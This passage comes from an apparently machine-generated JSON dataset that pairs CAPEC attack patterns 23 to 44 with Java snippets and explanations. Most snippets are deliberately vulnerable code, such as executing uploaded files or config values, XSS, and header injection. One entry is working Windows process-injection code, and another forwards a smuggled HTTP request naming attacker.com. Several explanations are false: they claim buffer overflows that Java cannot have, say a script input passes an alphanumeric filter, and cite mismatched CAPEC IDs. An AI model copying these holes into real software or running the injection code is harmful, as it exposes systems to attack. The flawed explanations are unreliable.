}\n}",
        "description": "This Java code snippet represents a vulnerable server that listens for client connections on port 8080. The server accepts client connections and starts a new thread to handle each client. The client is expected to send an authentication message in the format 'AUTH username password'. However, the server only checks if the username is 'admin' and does not verify the password, leading to improper authentication (CWE-287). This lack of proper authentication allows an attacker to spoof the client and gain unauthorized access, exploiting the trust the server places in the client (CAPEC-290). Additionally, the code does not validate the input properly (CWE-20), which could lead to further vulnerabilities."
    },
    {
        "capec_id": "23",
        "capec_name": "File Content Injection",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class FileUpload {\n    public static void main(String[] args) {\n        try {\n            // Simulate file upload\n            String uploadedFileName = \"malicious.exe\";\n            Path uploadedFilePath = Paths.get(\"/uploads/\" + uploadedFileName);\n            byte[] fileContent = Files.readAllBytes(uploadedFilePath);\n\n            // Improper input validation\n            if (uploadedFileName.endsWith(\".exe\")) {\n                System.out.println(\"Executable file detected: \" + uploadedFileName);\n                // Simulate execution of the uploaded file\n                Runtime.getRuntime().exec(uploadedFilePath.toString());\n            } else {\n                System.out.println(\"File uploaded successfully: \" + uploadedFileName);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable file upload mechanism that embodies the main idea of the CAPEC 'File Content Injection'. The code simulates the upload of a file and checks its extension to determine if it is an executable. If the file is an executable, it is executed without proper validation, representing CWE-20 (Improper Input Validation) and CWE-434 (Unrestricted Upload of File with Dangerous Type). The code also relies on the file extension to determine behavior, which is related to CWE-646 (Reliance on File Name or Extension of Externally-Supplied File). This snippet highlights the risks of executing untrusted files based on their names or extensions, potentially leading to malicious code execution."
    },
    {
        "capec_id": "24",
        "capec_name": "Filter Failure through Buffer Overflow",
        "code_snippet": "import java.util.Scanner;\n\npublic class FilterFailureExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your input:\");\n        String userInput = scanner.nextLine();\n\n        // Vulnerable buffer size\n        char[] buffer = new char[10];\n\n        // Attempt to copy user input to buffer without size check\n        for (int i = 0; i < userInput.length(); i++) {\n            buffer[i] = userInput.charAt(i); // CWE-120, CWE-119\n        }\n\n        // Simulate a filter that fails to handle oversized input\n        if (userInput.length() > buffer.length) {\n            System.out.println(\"Filter failed: input too long\");\n        } else {\n            System.out.println(\"Input accepted: \" + new String(buffer));\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a filter failure through a buffer overflow, embodying the main idea of the CAPEC. The code reads user input and attempts to copy it into a fixed-size buffer without checking the input size, leading to a potential buffer overflow (CWE-120, CWE-119). If the input length exceeds the buffer size, the filter fails, and the input is not properly handled, representing a failure in secure filtering. This example highlights the importance of proper input validation and buffer size checks to prevent such vulnerabilities."
    },
    {
        "capec_id": "25",
        "capec_name": "Forced Deadlock",
        "code_snippet": "import java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class ForcedDeadlockExample {\n    private final Lock lock1 = new ReentrantLock();\n    private final Lock lock2 = new ReentrantLock();\n\n    public void method1() {\n        lock1.lock();\n        try {\n            // Simulate some work with lock1\n            Thread.sleep(50);\n            lock2.lock();\n            try {\n                // Simulate some work with lock2\n                Thread.sleep(50);\n            } finally {\n                lock2.unlock();\n            }\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        } finally {\n            lock1.unlock();\n        }\n    }\n\n    public void method2() {\n        lock2.lock();\n        try {\n            // Simulate some work with lock2\n            Thread.sleep(50);\n            lock1.lock();\n            try {\n                // Simulate some work with lock1\n                Thread.sleep(50);\n            } finally {\n                lock1.unlock();\n            }\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        } finally {\n            lock2.unlock();\n        }\n    }\n\n    public static void main(String[] args) {\n        ForcedDeadlockExample example = new ForcedDeadlockExample();\n        Thread t1 = new Thread(example::method1);\n        Thread t2 = new Thread(example::method2);\n        t1.start();\n        t2.start();\n    }\n}",
        "description": "This Java code snippet demonstrates a forced deadlock scenario. The `ForcedDeadlockExample` class contains two methods, `method1` and `method2`, each acquiring two locks (`lock1` and `lock2`) in different orders. When `method1` and `method2` are executed concurrently by separate threads, they can cause a deadlock because `method1` locks `lock1` and waits for `lock2`, while `method2` locks `lock2` and waits for `lock1`. This situation leads to both threads being blocked indefinitely, embodying the concept of a forced deadlock as described in the CAPEC. The related CWEs are represented by the improper synchronization and locking mechanisms that lead to this deadlock condition."
    },
    {
        "capec_id": "26",
        "capec_name": "Leveraging Race Conditions",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class RaceConditionExample {\n    private static final String FILE_PATH = \"example.txt\";\n\n    public static void main(String[] args) throws InterruptedException {\n        Thread writerThread = new Thread(() -> {\n            try {\n                writeToFile(\"Initial content\");\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n\n        Thread attackerThread = new Thread(() -> {\n            try {\n                // Simulate attacker replacing the file\n                Thread.sleep(50); // Wait to create a race window\n                File maliciousFile = new File(FILE_PATH);\n                if (maliciousFile.exists()) {\n                    maliciousFile.delete();\n                }\n                writeToFile(\"Malicious content\");\n            } catch (IOException | InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n\n        writerThread.start();\n        attackerThread.start();\n\n        writerThread.join();\n        attackerThread.join();\n    }\n\n    private static void writeToFile(String content) throws IOException {\n        FileWriter writer = new FileWriter(FILE_PATH, true);\n        writer.write(content);\n        writer.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a race condition vulnerability where two threads are accessing and modifying the same file concurrently. The 'writerThread' writes initial content to the file, while the 'attackerThread' waits for a short period to create a race window and then replaces the file with malicious content. This example embodies the main idea of CAPEC-367 (Leveraging Race Conditions) and highlights CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization) and CWE-363 (Race Condition Enabling Link Following). The race condition occurs because the file access and modification are not properly synchronized, allowing the attacker to replace the file during the operation."
    },
    {
        "capec_id": "27",
        "capec_name": "Leveraging Race Conditions via Symbolic Links",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.PosixFilePermissions;\n\npublic class SymlinkRaceCondition {\n    public static void main(String[] args) throws IOException, InterruptedException {\n        String tempFileName = \"/tmp/tempfile.txt\";\n        Path tempFilePath = Paths.get(tempFileName);\n\n        // Check if the temporary file exists\n        if (Files.exists(tempFilePath)) {\n            System.out.println(\"Temporary file already exists.\");\n            return;\n        }\n\n        // Simulate a delay to create a race condition window\n        Thread.sleep(1000);\n\n        // Create the temporary file\n        Files.createFile(tempFilePath);\n        Files.setPosixFilePermissions(tempFilePath, PosixFilePermissions.fromString(\"rw-------\"));\n\n        // Write to the temporary file\n        try (FileWriter writer = new FileWriter(tempFileName)) {\n            writer.write(\"Sensitive data\");\n        }\n\n        System.out.println(\"Temporary file created and written to.\");\n    }\n}",
        "description": "This Java code snippet demonstrates a race condition vulnerability involving symbolic links (symlinks). The program attempts to create and write to a temporary file in the /tmp directory. The vulnerability arises because there is a delay (Thread.sleep(1000)) between checking if the file exists (Files.exists) and creating the file (Files.createFile). During this delay, an attacker could create a symbolic link with the same name as the temporary file, pointing to a sensitive file. When the program writes to the temporary file, it would actually write to the sensitive file, leading to unauthorized modification. This example embodies the main idea of the CAPEC by illustrating how an attacker can exploit a time-of-check time-of-use (TOCTOU) race condition to leverage symbolic links and write to sensitive files."
    },
    {
        "capec_id": "28",
        "capec_name": "Fuzzing",
        "code_snippet": "import java.io.*;\nimport java.util.Random;\n\npublic class FuzzingExample {\n    public static void main(String[] args) {\n        FuzzingExample example = new FuzzingExample();\n        for (int i = 0; i < 1000; i++) {\n            String fuzzInput = example.generateRandomInput();\n            example.processInput(fuzzInput);\n        }\n    }\n\n    public String generateRandomInput() {\n        int leftLimit = 32; // space\n        int rightLimit = 126; // tilde\n        int targetStringLength = 10;\n        Random random = new Random();\n        StringBuilder buffer = new StringBuilder(targetStringLength);\n        for (int i = 0; i < targetStringLength; i++) {\n            int randomLimitedInt = leftLimit + (int) \n              (random.nextFloat() * (rightLimit - leftLimit + 1));\n            buffer.append((char) randomLimitedInt);\n        }\n        return buffer.toString();\n    }\n\n    public void processInput(String input) {\n        try {\n            // CWE-20: Improper Input Validation\n            if (input == null || input.isEmpty()) {\n                throw new IllegalArgumentException(\"Input cannot be null or empty\");\n            }\n            // CWE-74: Improper Neutralization of Special Elements\n            if (input.contains(\";\") || input.contains(\"--\")) {\n                throw new IllegalArgumentException(\"Input contains forbidden characters\");\n            }\n            // Simulate processing the input\n            System.out.println(\"Processing input: \" + input);\n        } catch (Exception e) {\n            // CWE-209: Generation of Error Message Containing Sensitive Information\n            System.err.println(\"Error processing input: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple fuzzing example where random inputs are generated and processed to identify potential weaknesses in the system. The `generateRandomInput` method creates random strings, which are then passed to the `processInput` method. The `processInput` method includes basic input validation checks (CWE-20) and neutralization of special elements (CWE-74). If an error occurs, an error message is generated (CWE-209). This code embodies the main idea of fuzzing (CAPEC) by treating the system as a black box and feeding it random inputs to uncover potential vulnerabilities."
    },
    {
        "capec_id": "29",
        "capec_name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class TOCTOURaceCondition {\n    public static void main(String[] args) {\n        String filePath = \"example.txt\";\n        File file = new File(filePath);\n\n        // Time of Check\n        if (file.exists() && file.canRead()) {\n            // Simulate a delay to create a window for race condition\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n\n            // Time of Use\n            try (FileInputStream fis = new FileInputStream(file)) {\n                int data = fis.read();\n                while (data != -1) {\n                    System.out.print((char) data);\n                    data = fis.read();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } else {\n            System.out.println(\"File does not exist or cannot be read.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Time-of-Check to Time-of-Use (TOCTOU) race condition. The code first checks if a file exists and is readable (Time of Check). It then introduces a delay, simulating a window where an attacker could potentially modify or replace the file. After the delay, the code attempts to read the file (Time of Use). If an attacker modifies the file during the delay, the program may behave unexpectedly, illustrating the vulnerability. This example embodies the main idea of CAPEC-367 and related CWEs by showing how a resource's state can change between the check and use, leading to potential security issues."
    },
    {
        "capec_id": "30",
        "capec_name": "Hijacking a Privileged Thread of Execution",
        "code_snippet": "import com.sun.jna.Memory;\nimport com.sun.jna.Native;\nimport com.sun.jna.Pointer;\nimport com.sun.jna.platform.win32.Kernel32;\nimport com.sun.jna.platform.win32.WinNT;\n\npublic class PrivilegedThreadHijack {\n    public static void main(String[] args) {\n        int pid = 1234; // Target process ID\n        WinNT.HANDLE process = Kernel32.INSTANCE.OpenProcess(WinNT.PROCESS_ALL_ACCESS, false, pid);\n        if (process == null) {\n            System.err.println(\"Failed to open process\");\n            return;\n        }\n\n        WinNT.HANDLE thread = Kernel32.INSTANCE.CreateRemoteThread(process, null, 0, new Pointer(0x12345678), null, 0, null);\n        if (thread == null) {\n            System.err.println(\"Failed to create remote thread\");\n            return;\n        }\n\n        Memory payload = new Memory(1024);\n        payload.setString(0, \"malicious code\");\n        Pointer remoteMemory = Kernel32.INSTANCE.VirtualAllocEx(process, null, payload.size(), WinNT.MEM_COMMIT, WinNT.PAGE_EXECUTE_READWRITE);\n        if (remoteMemory == null) {\n            System.err.println(\"Failed to allocate memory in remote process\");\n            return;\n        }\n\n        Kernel32.INSTANCE.WriteProcessMemory(process, remoteMemory, payload, (int) payload.size(), null);\n        Kernel32.INSTANCE.ResumeThread(thread);\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of hijacking a privileged thread of execution by injecting malicious code into a running process. The code uses the JNA (Java Native Access) library to interact with Windows API functions. It opens a target process with all access rights, creates a remote thread within that process, allocates memory in the remote process, writes a malicious payload into the allocated memory, and resumes the thread to execute the payload. This embodies the CAPEC idea of hijacking a privileged thread to evade detection and gain elevated privileges. The code also touches on related CWEs such as improper privilege management (CWE-270), process control (CWE-114), and potential race conditions (CWE-362)."
    },
    {
        "capec_id": "31",
        "capec_name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "code_snippet": "import javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class VulnerableCookieHandler {\n\n    public void handleLogin(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String username = request.getParameter(\"username\");\n        String password = request.getParameter(\"password\");\n\n        // Simulate authentication (insecure)\n        if (\"admin\".equals(username) && \"password123\".equals(password)) {\n            // Create a session cookie (insecure)\n            Cookie sessionCookie = new Cookie(\"sessionID\", \"123456\");\n            sessionCookie.setMaxAge(60 * 60 * 24 * 7); // 1 week (persistent cookie)\n            response.addCookie(sessionCookie);\n\n            // Store sensitive information in a cookie (insecure)\n            Cookie userCookie = new Cookie(\"username\", username);\n            response.addCookie(userCookie);\n\n            response.getWriter().write(\"Login successful\");\n        } else {\n            response.getWriter().write(\"Login failed\");\n        }\n    }\n\n    public void handleRequest(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        Cookie[] cookies = request.getCookies();\n        String sessionID = null;\n        String username = null;\n\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (\"sessionID\".equals(cookie.getName())) {\n                    sessionID = cookie.getValue();\n                } else if (\"username\".equals(cookie.getName())) {\n                    username = cookie.getValue();\n                }\n            }\n        }\n\n        // Insecure reliance on cookie values\n        if (\"123456\".equals(sessionID) && \"admin\".equals(username)) {\n            response.getWriter().write(\"Welcome, admin!\");\n        } else {\n            response.getWriter().write(\"Access denied\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of handling HTTP cookies in a web application. The `handleLogin` method simulates user authentication and creates persistent cookies to store session and user information without proper validation, encryption, or integrity checks. The `handleRequest` method retrieves these cookies and relies on their values to grant access to protected resources. This code is vulnerable to several attacks, including session fixation, cookie interception, and modification, as it does not validate or encrypt sensitive data, and assumes cookie values are immutable and trustworthy."
    },
    {
        "capec_id": "32",
        "capec_name": "XSS Through HTTP Query Strings",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\" + userInput + \"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to Cross-Site Scripting (XSS) through HTTP query strings. The servlet processes a GET request and retrieves a parameter named 'input' from the query string without proper validation or encoding. It then directly includes this user input in the HTML response. This can allow an attacker to inject malicious script code into the 'input' parameter, which will be executed by the victim's browser when they visit the page. This example embodies the main idea of CAPEC-139 (XSS Through HTTP Query Strings) and is related to several CWEs, including CWE-80 (Improper Neutralization of Script-Related HTML Tags in a Web Page), CWE-79 (Improper Neutralization of Input During Web Page Generation), and CWE-116 (Improper Encoding or Escaping of Output)."
    },
    {
        "capec_id": "33",
        "capec_name": "HTTP Request Smuggling",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class HttpRequestSmugglingServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // Read the original request\n        BufferedReader reader = request.getReader();\n        StringBuilder originalRequest = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            originalRequest.append(line).append(\"\\r\\n\");\n        }\n\n        // Maliciously crafted request to exploit HTTP request smuggling\n        String maliciousRequest = \"POST / HTTP/1.1\\r\\n\" +\n                                  \"Host: victim.com\\r\\n\" +\n                                  \"Content-Length: 13\\r\\n\" +\n                                  \"\\r\\n\" +\n                                  \"GET / HTTP/1.1\\r\\n\" +\n                                  \"Host: attacker.com\\r\\n\\r\\n\";\n\n        // Forward the malicious request to the backend server\n        forwardRequest(maliciousRequest, \"http://backend-server\");\n    }\n\n    private void forwardRequest(String request, String backendUrl) throws IOException {\n        URL url = new URL(backendUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setDoOutput(true);\n        connection.setRequestMethod(\"POST\");\n        OutputStream os = connection.getOutputStream();\n        os.write(request.getBytes());\n        os.flush();\n        os.close();\n\n        // Read the response from the backend server\n        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n        String inputLine;\n        StringBuilder response = new StringBuilder();\n        while ((inputLine = in.readLine()) != null) {\n            response.append(inputLine);\n        }\n        in.close();\n\n        System.out.println(\"Response from backend: \" + response.toString());\n    }\n}",
        "description": "This Java servlet code demonstrates an HTTP Request Smuggling attack. The servlet reads an incoming HTTP request and constructs a malicious request that exploits discrepancies in HTTP request parsing between different servers. The malicious request is then forwarded to a backend server. The code highlights the vulnerability where an intermediary (the servlet) does not properly handle or sanitize the incoming request, leading to potential security issues such as unauthorized access or request manipulation. This example embodies the main idea of CAPEC-33 (HTTP Request Smuggling) and incorporates related weaknesses like CWE-444 (Inconsistent Interpretation of HTTP Requests) and CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers)."
    },
    {
        "capec_id": "34",
        "capec_name": "HTTP Response Splitting",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        // Vulnerable to HTTP Response Splitting\n        response.setHeader(\"Location\", \"/newpage?param=\" + userInput);\n        response.getWriter().println(\"Redirecting...\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to HTTP Response Splitting. The servlet takes a user input from an HTTP request parameter and directly includes it in an HTTP header without proper neutralization of special characters like CR (Carriage Return) and LF (Line Feed). An attacker can exploit this by injecting CRLF sequences into the 'input' parameter, causing the server to split the HTTP response and potentially inject malicious content. This example embodies CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers) and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component)."
    },
    {
        "capec_id": "35",
        "capec_name": "Leverage Executable Code in Non-Executable Files",
        "code_snippet": "import java.io.*;\nimport java.util.Properties;\n\npublic class VulnerableConfigLoader {\n    public static void main(String[] args) {\n        try {\n            Properties config = new Properties();\n            FileInputStream fis = new FileInputStream(\"config.properties\");\n            config.load(fis);\n            fis.close();\n\n            // Vulnerable code: directly using untrusted input in an eval-like context\n            String command = config.getProperty(\"command\");\n            Runtime.getRuntime().exec(command);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an application loads a configuration file ('config.properties') and directly uses a property from this file to execute a system command. This embodies the CAPEC 'Leverage Executable Code in Non-Executable Files' by showing how an attacker could modify the configuration file to include malicious commands. The code does not neutralize or validate the input from the configuration file, leading to potential code injection (CWE-94) and eval injection (CWE-95) vulnerabilities. The use of 'Runtime.getRuntime().exec(command)' directly with untrusted input is particularly dangerous, as it allows for arbitrary command execution."
    },
    {
        "capec_id": "36",
        "capec_name": "Using Unpublished Interfaces or Functionality",
        "code_snippet": "public class UnpublishedInterface {\n    // Undocumented and unpublished method\n    void debugMode() {\n        System.out.println(\"Debug mode activated. Sensitive operations can be performed.\");\n        // Perform sensitive operations without authentication or authorization\n    }\n\n    public static void main(String[] args) {\n        UnpublishedInterface ui = new UnpublishedInterface();\n        // Directly invoking the unpublished method\n        ui.debugMode();\n    }\n}",
        "description": "This Java code snippet demonstrates a class with an unpublished and undocumented method `debugMode` that performs sensitive operations. The method is not intended to be publicly available and lacks authentication and authorization checks, making it vulnerable to exploitation. An attacker who discovers this method can invoke it directly, bypassing any security mechanisms. This example embodies the CAPEC concept of 'Using Unpublished Interfaces or Functionality' and highlights related CWEs such as 'Missing Authentication for Critical Function' (CWE-306), 'Missing Authorization' (CWE-862), and 'Inclusion of Undocumented Features or Chicken Bits' (CWE-1242)."
    },
    {
        "capec_id": "37",
        "capec_name": "Retrieve Embedded Sensitive Data",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class SensitiveDataExample {\n    public static void main(String[] args) {\n        String sensitiveData = \"password123\"; // CWE-312: Cleartext Storage of Sensitive Information\n        File file = new File(\"sensitiveData.txt\");\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(sensitiveData); // CWE-312: Cleartext Storage of Sensitive Information\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        // CWE-226: Sensitive Information in Resource Not Removed Before Reuse\n        // The sensitive data is not cleared from memory after use\n    }\n}",
        "description": "This Java code snippet demonstrates the vulnerability described in CAPEC- Retrieve Embedded Sensitive Data. The code stores sensitive information (a password) in cleartext within a file, which is a direct example of CWE-312 (Cleartext Storage of Sensitive Information). Additionally, the code does not clear the sensitive data from memory after use, which aligns with CWE-226 (Sensitive Information in Resource Not Removed Before Reuse). This makes the sensitive data potentially accessible to an attacker who can examine the file or memory, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "38",
        "capec_name": "Leveraging/Manipulating Configuration File Search Paths",
        "code_snippet": "import java.io.*;\n\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        String configPath = System.getenv(\"CONFIG_PATH\");\n        if (configPath == null) {\n            configPath = \"./default/config.properties\";\n        }\n\n        try (FileInputStream fis = new FileInputStream(configPath)) {\n            Properties config = new Properties();\n            config.load(fis);\n            String dbPassword = config.getProperty(\"db.password\");\n            System.out.println(\"Database password: \" + dbPassword);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to 'Leveraging/Manipulating Configuration File Search Paths' (CAPEC). The application reads a configuration file path from an environment variable 'CONFIG_PATH'. If the environment variable is not set, it defaults to a local path './default/config.properties'. This approach is vulnerable to CWE-426 (Untrusted Search Path) and CWE-427 (Uncontrolled Search Path Element) because an attacker can manipulate the 'CONFIG_PATH' environment variable to point to a malicious configuration file. Additionally, the code reads a plaintext password from the configuration file, which is related to CWE-555 (J2EE Misconfiguration: Plaintext Password in Configuration File). The code does not validate or sanitize the input path, making it susceptible to CWE-73 (External Control of File Name or Path) and CWE-99 (Improper Control of Resource Identifiers)."
    },
    {
        "capec_id": "39",
        "capec_name": "Manipulating Opaque Client-based Data Tokens",
        "code_snippet": "import javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableApp {\n    public void processRequest(HttpServletRequest request, HttpServletResponse response) {\n        // Retrieve the user role from a cookie\n        Cookie[] cookies = request.getCookies();\n        String userRole = \"guest\";\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (cookie.getName().equals(\"userRole\")) {\n                    userRole = cookie.getValue();\n                    break;\n                }\n            }\n        }\n\n        // Perform an action based on the user role\n        if (userRole.equals(\"admin\")) {\n            // Admin-specific action\n            response.getWriter().println(\"Welcome, Admin!\");\n        } else {\n            // Guest-specific action\n            response.getWriter().println(\"Welcome, Guest!\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable web application that retrieves a user's role from a cookie and performs actions based on that role. The code embodies the main idea of CAPEC-Token Manipulation by storing sensitive information (user role) in a cookie without proper validation or integrity checking (CWE-565). The cookie value can be manipulated by an attacker to gain unauthorized access to admin functionalities (CWE-285, CWE-302). Additionally, the code does not ensure the integrity of the cookie data (CWE-353) and stores sensitive information in cleartext (CWE-315). This example highlights the risks of relying on client-side data for security-critical operations without proper validation and integrity checks."
    },
    {
        "capec_id": "40",
        "capec_name": "Manipulating Writeable Terminal Devices",
        "code_snippet": "import java.io.*;\n\npublic class VulnerableTerminal {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java VulnerableTerminal <command>\");\n            return;\n        }\n\n        String command = args[0];\n        try {\n            // Vulnerable to command injection\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable terminal application that accepts a command as an argument and executes it. The main idea of the CAPEC is represented by allowing an attacker to manipulate a writable terminal device. The code is vulnerable to command injection (CWE-77, CWE-78) because it directly uses user input to construct and execute an OS command without proper sanitization. Additionally, the command and its arguments are visible to other processes (CWE-214), and the process control is not properly managed (CWE-114). This code snippet embodies the risk of executing malicious commands with the privileges of the user running the terminal application."
    },
    {
        "capec_id": "41",
        "capec_name": "Using Meta-characters in E-mail Headers to Inject Malicious Payloads",
        "code_snippet": "import java.util.Properties;\nimport javax.mail.Message;\nimport javax.mail.Session;\nimport javax.mail.Transport;\nimport javax.mail.internet.InternetAddress;\nimport javax.mail.internet.MimeMessage;\n\npublic class EmailInjectionExample {\n    public static void main(String[] args) {\n        String to = \"victim@example.com\";\n        String from = \"attacker@example.com\";\n        String host = \"localhost\";\n\n        Properties properties = System.getProperties();\n        properties.setProperty(\"mail.smtp.host\", host);\n        Session session = Session.getDefaultInstance(properties);\n\n        try {\n            MimeMessage message = new MimeMessage(session);\n            message.setFrom(new InternetAddress(from));\n            message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));\n\n            // Vulnerable code: meta-characters in the subject header\n            String subject = \"Subject: Test\\nBcc: another-victim@example.com\";\n            message.setSubject(subject);\n\n            message.setText(\"This is a test email.\");\n\n            Transport.send(message);\n            System.out.println(\"Sent message successfully....\");\n        } catch (Exception mex) {\n            mex.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an attacker can inject malicious payloads into email headers using meta-characters. The code constructs an email message and sets its subject header with a string that includes a newline character followed by a Bcc header. This can lead to improper behavior in email clients that do not correctly handle such meta-characters, potentially allowing the attacker to send emails to unintended recipients or execute other malicious actions. The code highlights the importance of properly neutralizing meta-characters in email headers to prevent such attacks."
    },
    {
        "capec_id": "42",
        "capec_name": "MIME Conversion",
        "code_snippet": "import java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.util.Base64;\n\npublic class MimeConversion {\n    public static void main(String[] args) {\n        String input = \"VGhpcyBpcyBhIHRlc3Qgc3RyaW5nIHRoYXQgaXMgdG9vIGxvbmcgZm9yIHRoZSBidWZmZXIu\"; // Base64 encoded string\n        try {\n            byte[] decodedBytes = Base64.getDecoder().decode(input);\n            String result = convertToMime(decodedBytes);\n            System.out.println(result);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static String convertToMime(byte[] data) throws IOException {\n        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();\n        for (int i = 0; i < data.length; i++) {\n            // CWE-120: Buffer Copy without Checking Size of Input\n            outputStream.write(data[i]);\n        }\n        return outputStream.toString();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable MIME conversion routine. The `convertToMime` method takes a byte array and writes it to a `ByteArrayOutputStream` without checking the size of the input buffer, leading to a potential buffer overflow (CWE-120). The `main` method decodes a Base64 encoded string and passes the resulting byte array to the `convertToMime` method. This example embodies the main idea of the CAPEC by showing how an attacker could exploit a weakness in the MIME conversion routine to cause a buffer overflow and potentially gain control over the system. The code also highlights the importance of proper input validation and buffer size checking to prevent such vulnerabilities."
    },
    {
        "capec_id": "43",
        "capec_name": "Exploiting Multiple Input Interpretation Layers",
        "code_snippet": "import java.util.regex.Pattern;\n\npublic class VulnerableInputHandler {\n    public static void main(String[] args) {\n        String userInput = args[0];\n        String sanitizedInput = sanitizeInput(userInput);\n        if (isValidInput(sanitizedInput)) {\n            executeCommand(sanitizedInput);\n        } else {\n            System.out.println(\"Invalid input detected.\");\n        }\n    }\n\n    private static String sanitizeInput(String input) {\n        // First parser layer: remove HTML tags\n        return input.replaceAll(\"<.*?>\", \"\");\n    }\n\n    private static boolean isValidInput(String input) {\n        // Input validation layer\n        String regex = \"^[a-zA-Z0-9]+$\";\n        return Pattern.matches(regex, input);\n    }\n\n    private static void executeCommand(String input) {\n        // Second parser layer: execute OS command\n        try {\n            String command = \"echo \" + input;\n            Process process = Runtime.getRuntime().exec(command);\n            process.waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability based on the CAPEC description of 'Exploiting Multiple Input Interpretation Layers'. The code processes user input through multiple layers: first, it sanitizes the input by removing HTML tags, then it validates the sanitized input against a regex pattern, and finally, it executes an OS command using the validated input. The vulnerability arises because the input validation occurs before the final parsing layer (OS command execution), allowing an attacker to craft input that bypasses the validation but becomes dangerous after the final parsing step. For example, an input like '<script>alert(1)</script>' would pass the validation after sanitization but could still be harmful when executed as an OS command."
    },
    {
        "capec_id": "44",
        "capec_name": "Overflow Binary Resource File",
